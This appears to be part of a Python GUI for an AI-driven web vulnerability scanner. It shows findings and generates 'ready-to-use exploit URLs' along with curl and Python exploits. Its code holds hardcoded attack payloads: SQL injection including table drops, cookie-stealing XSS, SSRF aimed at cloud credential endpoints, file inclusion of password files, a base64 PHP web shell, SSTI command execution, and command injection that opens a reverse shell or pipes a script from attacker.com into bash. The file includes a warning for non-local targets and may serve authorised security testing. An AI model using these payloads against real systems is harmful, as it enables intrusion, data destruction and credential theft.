                    self.colors["warning"]
                    if level == "WARNING"
                    else self.colors["text_dim"]
                )
            )
        )

        self.output_text.tag_config(level, foreground=color)
        self.output_text.insert(tk.END, f"{prefix} {timestamp} {message}\n", level)
        self.output_text.see(tk.END)

    def update_live_view(self, html_content):
        if not self.is_scanning:
            return

        if html_content is None:
            self._set_live_view_message(
                "Live view unavailable. No browser content detected yet.\n"
                "If this persists, run without browser mode or install a compatible driver."
            )
            return

        content = str(html_content).strip()
        if not content:
            self._set_live_view_message(
                "Live view unavailable. Empty response content received."
            )
            return

        self.last_live_view_update = time.time()
        self.live_view_warned = False

        max_chars = 10000
        if len(content) > max_chars:
            content = content[:max_chars] + "\n... [truncated]"

        header = f"[{datetime.now().strftime('%H:%M:%S')}] Live view snapshot\n\n"
        self.live_view_text.delete(1.0, tk.END)
        self.live_view_text.insert(tk.END, header + content)

    def _set_live_view_message(self, message):
        self.live_view_text.delete(1.0, tk.END)
        self.live_view_text.insert(tk.END, message)

    def _schedule_live_view_watchdog(self):
        if self.live_view_watchdog_id:
            self.root.after_cancel(self.live_view_watchdog_id)
        self.live_view_watchdog_id = self.root.after(1500, self._live_view_watchdog)

    def _stop_live_view_watchdog(self):
        if self.live_view_watchdog_id:
            self.root.after_cancel(self.live_view_watchdog_id)
            self.live_view_watchdog_id = None

    def _live_view_watchdog(self):
        if not self.is_scanning:
            self.live_view_watchdog_id = None
            return

        if time.time() - self.last_live_view_update > 6 and not self.live_view_warned:
            self._set_live_view_message(
                "Live view unavailable. No browser content detected yet.\n"
                "Scanning continues in the background."
            )
            self.live_view_warned = True

        self.live_view_watchdog_id = self.root.after(1500, self._live_view_watchdog)

    def add_finding(self, finding):
        self.findings.append(finding)
        vuln_type = finding.get("type", "Vuln")
        display_text = f"[{vuln_type}] {finding.get('url', 'URL')}"

        self.findings_list.insert(tk.END, display_text)

        # Color coding based on severity
        index = self.findings_list.size() - 1

        high_severity = [
            "SQL",
            "Command",
            "RCE",
            "Upload",
            "XXE",
            "SSRF",
            "Auth",
            "Admin",
            "Mass Assignment",
        ]
        if any(s.lower() in vuln_type.lower() for s in high_severity):
            self.findings_list.itemconfig(index, {"fg": self.colors["danger"]})  # RED
        else:
            self.findings_list.itemconfig(
                index, {"fg": self.colors["warning"]}
            )  # YELLOW

        self.findings_list.see(tk.END)

    def on_finding_select(self, event):
        selection = self.findings_list.curselection()
        if not selection:
            return
        index = selection[0]
        finding = self.findings[index]

        # Extract base URL and generate full payload URLs
        vuln_url = finding.get("url", "http://target.com")
        vuln_type = finding.get("type", "")

        # Generate full URL examples with payloads
        full_url_examples = self._generate_full_url_payloads(vuln_url, vuln_type)

        flags = finding.get("flags", [])
        flags_text = ", ".join(flags) if isinstance(flags, list) and flags else "None"

        content = f"""# 🚨 VULNERABILITY DETECTED
 Type: {finding.get('type')}
 URL:  {finding.get('url')}
 Payload: {finding.get('payload')}
 Flags: {flags_text}
 Evidence: {finding.get('evidence', '')}
 Status Code: {finding.get('status_code', 'N/A')}
 Reward: {finding.get('reward', 'N/A')}
 Snippet: {finding.get('response_snippet', '')}

# 🛠️ ATTACK VECTOR
{ExploitGenerator.get_steps(finding)}

# 💡 READY-TO-USE EXPLOIT URLS (Copy & Paste in Browser/Burp)
{full_url_examples}

# 💻 CURL EXPLOIT
{ExploitGenerator.generate_curl(finding)}

# 🐍 PYTHON EXPLOIT
{ExploitGenerator.generate_python(finding)}
"""
        self.exploit_text.delete(1.0, tk.END)
        self.exploit_text.insert(tk.END, content)

    def _generate_full_url_payloads(self, base_url, vuln_type):
        """Generate dynamic, context-aware URLs with payloads injected"""
        from urllib.parse import urlparse, parse_qs, urlencode
        import random

        parsed = urlparse(base_url)
        base_path = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Extract existing parameters from URL
        existing_params = parse_qs(parsed.query)
        param_names = (
            list(existing_params.keys())
            if existing_params
            else ["id", "q", "search", "param"]
        )

        # Use first param or generate common ones
        main_param = param_names[0] if param_names else "id"

        examples = []

        if "SQL" in vuln_type:
            # Dynamic SQL injection payloads based on context
            sql_payloads = [
                f"1' OR 1=1--",
                f"admin'--",
                f"1' UNION SELECT username,password FROM users--",
                f"1' AND SLEEP(5)--",
                f"admin' OR '1'='1",
                f"1' UNION SELECT NULL,NULL,NULL--",
                f"1' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
                f"1'; DROP TABLE users--",
                f"1' OR 'x'='x",
                f"1' UNION SELECT @@version,NULL--",
            ]

            # Generate varied examples with different parameters
            for i, payload in enumerate(
                random.sample(sql_payloads, min(5, len(sql_payloads)))
            ):
                param = random.choice(
                    ["id", "user", "search", "q", "username", main_param]
                )
                examples.append(f"{base_path}?{param}={payload}")

        elif "XSS" in vuln_type:
            # Dynamic XSS payloads with encoding variations
            xss_payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(document.cookie)>",
                "<svg/onload=alert(1)>",
                '"><script>alert(String.fromCharCode(88,83,83))</script>',
                "javascript:alert(1)",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea onfocus=alert(1) autofocus>",
            ]

            for i, payload in enumerate(
                random.sample(xss_payloads, min(5, len(xss_payloads)))
            ):
                param = random.choice(
                    ["q", "search", "comment", "name", "input", main_param]
                )
                # URL encode some payloads
                if i % 2 == 0:
                    from urllib.parse import quote

                    payload = quote(payload)
                examples.append(f"{base_path}?{param}={payload}")

        elif "SSRF" in vuln_type:
            # Dynamic SSRF targets
            ssrf_targets = [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:22",
                "http://localhost:6379",
                "file:///etc/passwd",
                "http://127.0.0.1:8080",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/latest/user-data",
                "gopher://127.0.0.1:6379/_INFO",
                "dict://127.0.0.1:11211/stat",
            ]

            for target in random.sample(ssrf_targets, min(5, len(ssrf_targets))):
                param = random.choice(
                    ["url", "redirect", "fetch", "proxy", "link", main_param]
                )
                examples.append(f"{base_path}?{param}={target}")

        elif "LFI" in vuln_type or "Path" in vuln_type:
            # Dynamic LFI payloads with different traversal depths
            lfi_payloads = [
                "../../../../etc/passwd",
                "....//....//....//etc/shadow",
                "php://filter/convert.base64-encode/resource=index.php",
                "..\\..\\..\\..\\windows\\win.ini",
                "/var/log/apache2/access.log",
                "../../../../proc/self/environ",
                "php://input",
                "expect://whoami",
                "zip://shell.zip#shell.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            ]

            for payload in random.sample(lfi_payloads, min(5, len(lfi_payloads))):
                param = random.choice(
                    ["file", "page", "include", "path", "doc", main_param]
                )
                examples.append(f"{base_path}?{param}={payload}")

        elif "Command" in vuln_type:
            # Dynamic command injection with different separators
            cmd_payloads = [
                "; whoami",
                "| cat /etc/passwd",
                "$(id)",
                "; ls -la",
                "127.0.0.1; nc attacker.com 4444 -e /bin/bash",
                "& dir",
                "`whoami`",
                "|| uname -a",
                "; curl http://attacker.com/shell.sh | bash",
                "& powershell -c Get-Process",
            ]

            for payload in random.sample(cmd_payloads, min(5, len(cmd_payloads))):
                param = random.choice(
                    ["cmd", "exec", "run", "shell", "ping", main_param]
                )
                examples.append(f"{base_path}?{param}={payload}")

        elif "IDOR" in vuln_type:
            # Dynamic IDOR examples with different ID formats
            idor_examples = [
                f"{base_path}?id=1 → Try: id=2, id=999, id=admin",
                f"{base_path}?user_id=123 → Try: user_id=1, user_id=100",
                f"{base_path}?document=abc123 → Try: document=xyz789",
                f"{base_path.replace('/user/', '/admin/')} (privilege escalation)",
                f"{base_path}?uuid=550e8400-e29b-41d4-a716-446655440000 → Try different UUIDs",
            ]
            examples = idor_examples[:5]

        elif "SSTI" in vuln_type:
            # Dynamic SSTI payloads for different template engines
            ssti_payloads = [
                "{{7*7}}",  # Jinja2
                "{{config}}",  # Flask
                "{{''.__class__.__mro__[1].__subclasses__()}}",  # Python
                "${7*7}",  # Freemarker
                "#{7*7}",  # Ruby
                "{{constructor.constructor('alert(1)')()}}",  # AngularJS
                "{{''.class.mro()[1].subclasses()}}",  # Jinja2
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "${{<%[%'\"}}%\\",  # Polyglot
                "{{config.items()}}",
            ]

            for payload in random.sample(ssti_payloads, min(5, len(ssti_payloads))):
                param = random.choice(
                    ["template", "name", "input", "data", "msg", main_param]
                )
                examples.append(f"{base_path}?{param}={payload}")

        elif "OAuth" in vuln_type or "CSRF" in vuln_type:
            # OAuth-specific payloads
            oauth_payloads = [
                f"{base_path}?redirect_uri=https://attacker.com/callback",
                f"{base_path}?redirect_uri={parsed.scheme}://{parsed.netloc}@attacker.com",
                f"{base_path}?client_id=test&response_type=code (missing state parameter)",
                f"{base_path}?redirect_uri=javascript:alert(1)",
                f"{base_path}/callback?code=STOLEN_CODE",
            ]
            examples = oauth_payloads

        elif "XXE" in vuln_type:
            # XXE payloads (for POST requests)
            xxe_payloads = [
                'POST with: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                'POST with: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
                'POST with: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
                f"{base_path} (Send XML with external entity)",
                f"{base_path} (Content-Type: application/xml)",
            ]
            examples = xxe_payloads

        else:
            # Generic dynamic payloads
            generic_payloads = [
                f"{base_path}?{main_param}=1' OR 1=1--",
                f"{base_path}?{main_param}=<script>alert(1)</script>",
                f"{base_path}?{main_param}=../../../../etc/passwd",
                f"{base_path}?{main_param}=; whoami",
                f"{base_path}?{main_param}={{{{7*7}}}}",
            ]
            examples = generic_payloads

        # Add context-aware note
        context_note = f"\n💡 TIP: Payloads are dynamically generated based on:\n   - URL structure: {base_path}\n   - Detected parameters: {', '.join(param_names) if param_names else 'None (using defaults)'}\n   - Vulnerability type: {vuln_type}\n"

        return context_note + "\n".join([f"- {url}" for url in examples])

    def copy_exploit(self):
        content = self.exploit_text.get(1.0, tk.END)
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        messagebox.showinfo("COPIED", "Exploit payload copied to clipboard.")

    def start_scan(self, ai_mode=None, pentester=None):
        profile_config = self._get_scan_profile_config(self.scan_profile.get())
        if ai_mode is None:
            ai_mode = bool(profile_config.get("ai_mode", False))
        if pentester is None:
            pentester = self.pentester_mode.get()
        if pentester:
            ai_mode = True

        target = self.target_url.get().strip()

        # Validation
        if not target:
            messagebox.showerror("Error", "Please enter a target URL.")
            return
        # Only add http:// if user didn't specify any protocol
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
            self.log(f"No protocol specified, defaulting to HTTP: {target}", "INFO")
        else:
            # User specified protocol - respect their choice
            if target.startswith("https://"):
                self.log(f"Using HTTPS as specified: {target}", "INFO")
            else:
                self.log(f"Using HTTP as specified: {target}", "INFO")

        # Sanity-check the URL actually has a real hostname before handing
        # it to the scan thread -- catches "http://" alone, "http:// foo",
        # stray spaces, etc. that would otherwise crash deep inside
        # SecurityAuditor with a raw traceback dumped into the output box
        # instead of a clear, fixable message shown up front.
        parsed = urllib.parse.urlparse(target)
        if not parsed.netloc or " " in target:
            messagebox.showerror(
                "Error",
                f"'{target}' doesn't look like a valid URL.\n\n"
                "Expected something like: http://localhost:5002 or https://example.com",
            )
            return

        # Safety confirmation for anything that isn't a local mock target.
        # This is a pentesting tool -- launching an intensive automated
        # attack (especially --persist mode, which retries with growing
        # intensity up to 50 times) against a real external host by
        # accident is exactly the kind of mistake a confirmation dialog
        # exists to prevent. Localhost/127.0.0.1/mock-target ports are
        # exempt since that's the expected everyday workflow.
        hostname = (parsed.hostname or "").lower()
        is_local = hostname in ("localhost", "127.0.0.1", "0.0.0.0") or hostname.startswith("192.168.")
        if not is_local:
            proceed = messagebox.askyesno(
                "Confirm External Target",
                f"You are about to scan a non-local target:\n\n{target}\n\n"
                "Only scan systems you own or have explicit written permission to test. "
                "Unauthorized scanning may be illegal.\n\nProceed?",
                icon="warning",
            )
            if not proceed:
                self.log("Scan cancelled by user (external target not confirmed).", "INFO")
                return

        model_selection = self.model_path.get()
        if " (Final)" in model_selection:
            model = model_selection.replace(" (Final)", "")
        else:
            model = model_selection

        # Confirm the selected model file actually exists before spinning
        # up the scan thread -- otherwise this fails deep inside model
        # loading with a raw traceback instead of a clear message here.
        if model and not os.path.exists(model):
            messagebox.showerror(
                "Error",
                f"Selected model file not found:\n{model}\n\n"
                "Pick a different model from the dropdown, or Browse to a valid .pth file.",
            )
            return

        self.scan_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.is_scanning = True
        self.progress.start(10)
        self.output_text.delete(1.0, tk.END)
        self.findings_list.delete(0, tk.END)
        self.findings = []
        self.exploit_text.delete(1.0, tk.END)
        mode_label = "FULL AI" if ai_mode else "HYBRID"
        self.exploit_text.insert(
            tk.END,
            f"// Scanning target... Mode: {mode_label}... Awaiting findings...",
        )
        self.live_view_text.delete(1.0, tk.END)
        self.live_view_text.insert(tk.END, "Waiting for agent visual input...\n")
        self.last_live_view_update = time.time()
        self.live_view_warned = False
        self._schedule_live_view_watchdog()

        threading.Thread(
            target=self.run_scan,
            args=(target, model, ai_mode, pentester),
            daemon=True,
        ).start()

    def run_scan(self, target, model, ai_mode=False, pentester=False):
        # Redirect stdout to GUI
        class StdoutRedirector:
            def __init__(self, text_widget):
                self.text_widget = text_widget

            def write(self, string):
                self.text_widget.after(
                    0, lambda: self.text_widget.insert(tk.END, string)
                )
                self.text_widget.after(0, lambda: self.text_widget.see(tk.END))

            def flush(self):
                pass

        old_stdout = sys.stdout
        sys.stdout = StdoutRedirector(self.output_text)

        try:
            targets = [target]  # Model only scans single specified target

            self.log(f"INITIATING ATTACK SEQUENCE ON {len(targets)} TARGET(S)", "INFO")
            self.log(f"MODEL: {os.path.basename(model)}", "INFO")

            # Proxy/Stealth removed - not used in mock target training
            self.log("ℹ️ Scanning local mock targets (no proxy needed)", "INFO")

            total_findings = 0

            for i, current_target in enumerate(targets):
                if not self.is_scanning:
                    break

                self.log(
                    f"\n🚀 SCANNING TARGET {i+1}/{len(targets)}: {current_target}",
                    "INFO",
                )

                self.auditor = SecurityAuditor(current_target, model)

                # Create a callback for rendering
                def render_callback(html_content):
                    self.root.after(0, lambda: self.update_live_view(html_content))

                # Hook the log_finding callback
                original_log_finding = self.auditor.log_finding

                def gui_log_finding(finding):
                    original_log_finding(finding)
                    self.root.after(0, lambda f=finding: self.add_finding(f))
                    # Log detailed vulnerability information
                    vuln_type = finding.get("type", "Unknown")
                    vuln_url = finding.get("url", "N/A")
                    vuln_payload = finding.get("payload", "N/A")
                    self.root.after(
                        0,
                        lambda: self.log(
                            f"🚨 VULNERABILITY CONFIRMED: {vuln_type}", "WARNING"
                        ),
                    )
                    self.root.after(
                        0, lambda: self.log(f"   └─ URL: {vuln_url}", "INFO")
                    )
                    self.root.after(
                        0, lambda: self.log(f"   └─ Payload: {vuln_payload}", "INFO")
                    )

                self.auditor.log_finding = gui_log_finding

                findings = self.auditor.start_audit(
                    crawl_depth=self.crawl_depth.get(),
                    test_intensity=self.test_episodes.get(),
                    persist=self.persist_mode.get(),
                    ai_mode=ai_mode,
                    pentester=pentester,
                    render_callback=render_callback,  # Pass the callback
                )
                total_findings += len(findings)

                # Check if user aborted during scan
                if not self.is_scanning:
                    self.log("⚠️ SCAN ABORTED BY USER", "WARNING")
                    break

            # Only show completion if not aborted
            if self.is_scanning:
                self.root.after(0, lambda: self.scan_complete(total_findings))

        except Exception as e:
            import traceback

            error_trace = traceback.format_exc()
            print(f"❌ CRITICAL UI SCAN ERROR: {e}\n{error_trace}")
            self.root.after(0, lambda: self.log(f"SYSTEM ERROR: {str(e)}", "ERROR"))
            self.root.after(0, lambda: self.stop_scan())
        finally:
            sys.stdout = old_stdout

    def scan_complete(self, count):
        self.log(f"MISSION COMPLETE. {count} TARGETS COMPROMISED.", "SUCCESS")
        self.progress.stop()
        self._stop_live_view_watchdog()
        self.scan_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.view_report_btn.config(state=tk.NORMAL)
        self.is_scanning = False
        messagebox.showinfo(
            "MISSION COMPLETE", f"Scan finished.\nFound {count} vulnerabilities."
        )

    def stop_scan(self):
        self.log("🛑 ABORTING MISSION...", "WARNING")
        self.is_scanning = False
        self._stop_live_view_watchdog()

        # Stop the auditor if it exists
        if self.auditor:
            try:
                self.auditor.stop()
            except Exception as e:
                self.log(f"Error stopping auditor: {e}", "ERROR")

        # Reset UI state
        self.progress.stop()
        self.scan_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log("❌ MISSION ABORTED BY USER", "WARNING")

    def view_report(self):
        reports = glob.glob("reports/vulnerability_report_*.md")
        if reports:
            latest = max(reports, key=os.path.getctime)
            try:
                os.startfile(latest)
            except AttributeError:
                webbrowser.open(os.path.abspath(latest))
        else:
            messagebox.showinfo("No Reports", "No vulnerability reports found.")




def _get_auto_profile_config(profile_key):
    normalized = (profile_key or "hybrid").strip().lower()
    profile_name = "Full AI" if normalized in {"full-ai", "full_ai", "ai", "fullai"} else "Hybrid"

    for name, config in SCAN_PROFILES:
        if name == profile_name:
            return profile_name, dict(config)

    fallback_name, fallback_config = SCAN_PROFILES[0]
    return fallback_name, dict(fallback_config)


def _resolve_model_for_auto(model_arg):
    if model_arg:
        return model_arg

    latest_ep, latest_model_path = find_latest_checkpoint()
    if latest_model_path:
        return latest_model_path

    return "dqn_web_sec_model.pth"


def run_automated_mode(args):
    if not args.target:
        print("[!] --target is required when using --auto")
        return 2

    target = args.target.strip()
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    profile_label, profile_config = _get_auto_profile_config(args.profile)

    depth = max(1, args.depth) if args.depth is not None else int(profile_config.get("depth", 30))
    intensity = (
        max(1, args.intensity)
        if args.intensity is not None
        else int(profile_config.get("intensity", 3))
    )

    persist = profile_config.get("persist", True)
    if args.persist is not None:
        persist = args.persist

    ai_mode = bool(profile_config.get("ai_mode", False))
    if args.ai_mode:
        ai_mode = True

    pentester = bool(profile_config.get("pentester", False))
    if args.pentester:
        pentester = True
        ai_mode = True

    model_path = _resolve_model_for_auto(args.model)

    project_root = os.path.dirname(os.path.abspath(__file__))
    autonomous_scan_path = os.path.join(project_root, "autonomous_scan.py")

    if not os.path.isabs(model_path):
        local_model = os.path.join(project_root, model_path)
        if os.path.exists(local_model):
            model_path = local_model

    cmd = [
        sys.executable,
        autonomous_scan_path,
        target,
        "--model",
        model_path,
        "--depth",
        str(depth),
        "--intensity",
        str(intensity),
    ]

    if persist:
        cmd.append("--persist")
    if ai_mode:
        cmd.append("--ai-mode")
    if pentester:
        cmd.append("--pentester")

    print("=" * 72)
    print("AI Scanner GUI - Automated Mode")
    print("=" * 72)
    print(f"Target    : {target}")
    print(f"Profile   : {profile_label}")
    print(f"Model     : {model_path}")
    print(f"Depth     : {depth}")
    print(f"Intensity : {intensity}")
    print(f"Persist   : {persist}")
    print(f"AI Mode   : {ai_mode}")
    print(f"Pentester : {pentester}")
    print("=" * 72)

    env = os.environ.copy()
    env.setdefault("PYTHONIOENCODING", "utf-8")
    completed = subprocess.run(cmd, cwd=project_root, env=env)
    return completed.returncode


def parse_cli_args():
    parser = argparse.ArgumentParser(
        description="Scanner GUI (interactive) + automation mode (--auto)"
    )
    parser.add_argument(
        "--auto",
        action="store_true",
        help="Run without launching GUI (headless automation mode).",
    )
    parser.add_argument(
        "--target",
        help="Target URL to scan (required with --auto).",
    )
    parser.add_argument(
        "--profile",
        choices=["hybrid", "full-ai"],
        default="hybrid",
        help="Preset profile for --auto mode (default: hybrid).",
    )
    parser.add_argument("--model", help="Model path for --auto mode.")
    parser.add_argument("--depth", type=int, help="Override crawl depth in --auto mode.")
    parser.add_argument(
        "--episodes",
        "--intensity",
        dest="intensity",
        type=int,
        help="Override attack intensity in --auto mode.",
    )

    persist_group = parser.add_mutually_exclusive_group()
    persist_group.add_argument(
        "--persist",
        dest="persist",
        action="store_true",
        help="Force persistence mode ON in --auto mode.",
    )
    persist_group.add_argument(
        "--no-persist",
        dest="persist",
        action="store_false",
        help="Force persistence mode OFF in --auto mode.",
    )
    parser.set_defaults(persist=None)

    parser.add_argument(
        "--ai-mode",
        action="store_true",
        help="Force AI mode ON in --auto mode.",
    )
    parser.add_argument(
        "--pentester",
        action="store_true",
        help="Enable pentester chain mode in --auto mode.",
    )

    return parser.parse_args()


if __name__ == "__main__":
    args = parse_cli_args()
    if args.auto:
        raise SystemExit(run_automated_mode(args))

    root = tk.Tk()
    app = SecurityScannerGUI(root)
    root.mainloop()
